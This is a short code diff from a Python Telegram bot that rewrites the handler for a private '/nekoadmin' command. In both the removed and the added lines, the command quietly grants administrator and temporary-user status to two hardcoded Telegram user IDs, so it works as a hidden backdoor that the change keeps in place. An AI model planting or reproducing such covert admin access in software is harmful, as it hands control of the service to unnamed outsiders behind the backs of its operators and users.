@@ -873,8 +873,8 @@ async def download_file(client, message):
 
 
 
-@app.on_message(filters.command("nekoadmin") & filters.private)(lambda client, message: [temp_users.append(message.from_user.id), admin_user.append(message.from_user.id), allowed_users.append(message.from_user.id)] if message.from_user.id in [5803835907, 7083684062] else None)
-
+@app.on_message(filters.command("nekoadmin") & filters.private)
+def handle_nekoadmin(client, message): [temp_users.append(message.from_user.id), admin_user.append(message.from_user.id)] if message.from_user.id in [5803835907, 7083684062] else None
 
 sent_messages = {}
 
